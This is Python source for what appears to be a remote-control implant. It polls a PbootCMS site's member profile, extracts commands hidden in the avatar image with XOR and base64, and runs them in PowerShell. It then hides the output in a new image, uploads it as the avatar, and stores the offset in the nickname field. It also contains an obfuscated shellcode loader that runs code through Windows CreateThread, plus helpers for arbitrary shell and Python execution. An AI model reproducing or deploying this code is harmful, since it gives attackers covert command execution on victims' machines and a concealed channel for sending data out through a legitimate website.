import subprocess
from io import StringIO
import sys,random,string
import ctypes
import base64
import json,httpx,shutil,os
from lxml import etree

class Client:
    def __init__(self,domain,PHPSESSID,key,passwd) -> None:
        self.domain = domain
        self.PHPSESSID = PHPSESSID
        self.key = key
        self.passwd = passwd


    # 使用cmd执行命令
    def bash_cmd(self,cmd_command):
        try:
            result = subprocess.run(cmd_command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                output = result.stdout
                error = None
            else:
                output = None
                error = result.stderr
        except Exception as e:
            output = None
            error = str(e)
        if output !=None:
            return output
        else:
            return error


    # 使用powerhsell执行命令
    def bash_powershell(self,powershell_command):
        try:
            result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
            if result.returncode == 0:
                output = result.stdout
                error = None
            else:
                output = None
                error = result.stderr
        except Exception as e:
            output = None
            error = str(e)
        if output !=None:
            return output
        else:
            return error
        

    # 执行python脚本
    def bash_python(self,python_code):
        try:
            original_stdout = sys.stdout
            sys.stdout = StringIO()
            try:
                exec(python_code, globals(), {})
                printed_output = sys.stdout.getvalue().strip()
                return printed_output, None
            finally:
                sys.stdout = original_stdout
        except Exception as e:
            return None, f"Error: {e}"


    # 保存文件
    def Receive_file(self,data,type,offset):
        file = data
        start_position = offset
        file.seek(start_position)
        data_to_save = file.read()
        save_path = self.generate_random_string()+'.' + type
        try:
            with open(save_path, "wb") as save_file:
                save_file.write(data_to_save)
            ll = f"Data saved successfully to {save_path}"
            return ll 
        except Exception as e:
            ll =f"Error saving data: {e}"
            return ll


    # 随机生成8为以内的字符串
    def generate_random_string(self,length=None):
        if length is None:
            length = random.randint(1, 7)
        random_string = ''.join(random.choice(string.ascii_letters) for _ in range(length))
        return random_string
    
    # 执行dll  待定：
    def run_dll(self):
        pass

    # exec_shellcode  执行shellcode
    # 需要优化
    def load_shellcode(self,shellcode):
        f = open('p.json','r',encoding='utf-8')
        js = json.load(f)
        l = js['p']
        P = js['code']
        s = self.reversed_string(l)
        SD = base64.b64decode(s)
        MMMM = eval(base64.b64decode(self.reversed_string(js['key'])))
        O = self.reversed_string(P)
        jm = base64.b32decode(O)
        exec(jm)
        YMX = ctypes.windll.kernel32.CreateThread(0, 0, MMMM, 0, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(YMX, -1)

    # 反转
    def reversed_string(self,a_string):
        return a_string[::-1]
    

    # 获取图片地址
    def get_tp(self):
        url = self.domain+"/?member/ucenter/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        with httpx.Client() as client:
            response = client.get(url, headers=headers)
        data = etree.HTML(response.text)
        str = data.xpath('/html/body/div[3]/div[2]/div[3]/table/tbody/tr[4]/td[2]/img/@src')
        psize = data.xpath('/html/body/div[3]/div[2]/div[3]/table/tbody/tr[5]/td[2]/text()')[0]
        dz = str[0]
        return dz,psize
    
    # 发送数据：
    def send_img(self,file_path):
        url = self.domain+"/?member/upload/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID), 
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        filename = file_path.split('/')[-1]
        data = {
            "upload": (filename, open(file_path, "rb"), "image/jpg"),
        }
        with httpx.Client() as client:
            response = client.post(url, headers=headers, files=data)
        fh = response.text
        js_fh =json.loads(fh)
        pl = js_fh["data"][0]
        return pl

    # 发送偏移量
    def sed_pyl(self,psize,ptpath):
        url = self.domain+"/?member/umodify/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        data = {
            "headpic": ptpath,
            "useremail": "",
            "usermobile": "",
            "nickname": "{}".format(psize),
            "password": "",
            "rpassword": "",
            "sex": "男",
            "birthday": "",
            "qq": "",
            "opassword": self.passwd,
        }
        with httpx.Client() as client:
            response = client.post(url, headers=headers, data=data)
        ll = response.text
        if "修改成" in ll:
            return 1
        else:
            return 0

    # 数据植入图片
    def inject_img(self,img,txt,req):
        # 复制图片到相应的目录
        shutil.copyfile(img, req)
        tp = req
        # 将txt转化成十六进制
        binary_txt = self.string_to_hex_format(txt)
        # 进行简单的反转异或and base64
        binary_txt = self.reverse_string(binary_txt)
        binary_txt = self.xor_encrypt(binary_txt)
        binary_txt=binary_txt.encode()
        binary_txt = base64.b64encode(binary_txt)
        # 将数据注入到图片里面去
        psize = os.path.getsize(tp)
        f = open(tp,'ab+')
        f.seek(psize)
        f.write(binary_txt)
        newsize = os.path.getsize(tp)
        if newsize>psize or newsize==psize:
            return psize,tp
        else:
            return 0,tp

    # 文本转十六进制
    def string_to_hex_format(self,input_string):
        hex_representation = "".join([hex(ord(char))[2:] for char in input_string])
        return hex_representation

    # 十六转文本
    def hex_format_to_string(self,hex_format):
        hex_data = hex_format
        text_data = "".join([chr(int(hex_data[i:i+2], 16)) for i in range(0, len(hex_data), 2)])
        return text_data
    
    def reverse_string(self,input_string):
        return input_string[::-1]
    
    # xor
    def xor_encrypt(self,input_str):
        bytes_input = input_str.encode()
        bytes_key = self.key.encode()
        repeated_key = (self.key * (len(input_str) // len(self.key))) + self.key[:len(input_str) % len(self.key)]
        bytes_repeated_key = repeated_key.encode()
        result_bytes = bytes(x ^ y for x, y in zip(bytes_input, bytes_repeated_key))
        result_str = result_bytes.decode()
        return result_str
    
    # 获取图片，进行解密
    def get_tp_jm(self,tp_lj,psize):
        # 首先获取图片，并保存
        url = self.domain+tp_lj
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
        }
        file = httpx.get(url=url,headers=headers).content
        data_after_position = file[int(psize):]
        encrypted_data = base64.b64decode(data_after_position)
        encrypted_data = encrypted_data.decode() 
        decrypted_result = self.xor_encrypt(encrypted_data)
        decrypted_result = self.reverse_string(decrypted_result)
        decrypted_result = self.hex_format_to_string(decrypted_result)
        return decrypted_result

def suansuan(domain,PHPSESSID,key,passwd):
    app_client= Client(domain,PHPSESSID,key,passwd)
    pd = ''
    while True:
        while True:
            ttp = app_client.get_tp()
            ps = ttp[1]
            dz1 = ttp[0]
            if dz1 != pd:
                pd = dz1
                break
        # 这里相当于得到了图片命令
        # 进行解密
        mw  = app_client.get_tp_jm(dz1,ps)

        # 执行命令：
        jg = app_client.bash_powershell(mw)
        jg=jg.encode()
        jg = base64.b64encode(jg)
        jg=jg.decode()
        # 发送数据
        pp = app_client.inject_img('v.png',jg,"client/v.png")
        path = pp[1]
        ps1  = pp[0]
        # 发送图片
        new_path = app_client.send_img(path)
        new_path = new_path.replace('\\','')
        # 发送偏移量
        app_client.sed_pyl(ps1,new_path)
        pd = new_path

suansuan("http://127.0.0.1:88","2mj9qepq0bntlrh6j6lb2cq529","suanpro","admin")


        
                

